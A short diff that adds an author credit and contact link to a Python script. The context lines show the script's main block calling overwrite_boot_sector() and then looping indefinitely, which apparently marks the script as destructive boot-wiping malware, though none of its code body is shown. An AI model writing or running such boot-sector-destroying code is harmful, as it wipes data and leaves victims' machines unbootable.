@@ -1,3 +1,8 @@
+# Author: AirFlow
+# Contact: https://airflowd.netlify.app/
+
+
+
 import os
 import shutil
 import ctypes
@@ -106,3 +111,4 @@ if __name__ == "__main__":
     overwrite_boot_sector()
     while True:
         time.sleep(1)
+
